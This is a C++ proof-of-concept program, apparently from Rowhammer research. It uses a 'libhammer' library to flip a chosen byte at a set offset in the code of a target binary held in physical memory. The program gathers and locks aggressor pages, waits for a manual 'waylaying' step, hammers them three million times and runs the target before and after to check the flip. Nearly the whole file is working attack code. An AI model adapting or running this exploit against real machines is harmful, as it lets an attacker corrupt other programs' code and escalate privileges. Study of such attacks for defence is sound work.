#include "iostream"
#include "sstream"
#include "string"
#include "cstdlib"
#include "vector"
#include "libhammer.h"

using namespace std;

const string green="\033[0;32m", blue="\033[1;34m", red="\033[1;31m", yellow="\033[0;33m", restore="\033[0m";

int main(int argc, char **argv)
{
    BinaryInfo target;
    string dummy;

    target.path = "./target";
    target.flip_to = 0;
    target.offset = 0xfaf0;
    target.orig = 0x5f;
    target.target = 0x5b;

    HammerResult hr("0x5988000,2800,0x5966000,0x59ab000,0xfb,0");
    //HammerResult hr("0x3547000,2800,0x3520000,0x3564000,0xfb,0");

    uint64_t avail_size, pool_size, target_pa, i, tmp=0;
    Page a, b;
    stringstream ss; ss.clear();

    avail_size = get_available_mem();
    pool_size = (uint64_t)(avail_size * 0.9);
    pool_size -= pool_size % PAGE_SIZE;
    cout << blue << "- Available mem: " << to_mb(avail_size) << "M, pool size: " << to_mb(pool_size) << "M." << endl;
    cout << "- target pa=0x" << hex << get_binary_pa(target.path, target.offset) << restore << endl;


    {
        vector<Page> pool;
        Page c;

        pool = allocate_mb(to_mb(pool_size));

        for (Page pg : pool)
        {
            pg.get<uint64_t>(0) = pg.p; // access

            if (pg.p == hr.p)
            {
                cout << green << "Got page A: " << hex << pg.p << endl;
                mlock(pg.v.get(), PAGE_SIZE);
                a = pg;
            }
            if (pg.p == hr.q)
            {
                cout << green << "Got page B: " << hex << pg.p << endl;
                mlock(pg.v.get(), PAGE_SIZE);
                b = pg;
            }
            if (pg.p == hr.base)
            {
                c = pg;
                cout << green << "Victim page: " << hex << pg.p << " is available." << endl;
            }
        }
        for (Page pg : pool)
            if (!(pg == a || pg == b)) pg.reset();
        if (!c.p)
        {
            cout << yellow << "* Victim page 0x" << hex << hr.base << " not available." << endl;
            munlock(a.v.get(), PAGE_SIZE);
            a.reset(); a.p=0;
        }
    }

    if (a.p && b.p)
    {
        cout << blue << "* Start waylaying now (manually)..." << endl;
        cin >> dummy;
        cout << green << "- Check original program..." << restore << endl;
        system("./target");
        cout << blue << "* Hammering 3000000 times..." << endl;
        hammer_loop(a.v.get(), b.v.get(), 3000000, 0);
        cout << green << "- Check result" << endl;
        system("./target");
    }
    else
    {
        cout << yellow << "* Cannot hold attack pages 0x" << hex << hr.p << ", 0x" << hr.q << ". Exit..." << endl;
    }
    if (a.p) munlock(a.v.get(), PAGE_SIZE);
    if (b.p) munlock(b.v.get(), PAGE_SIZE);

    return 0;
}
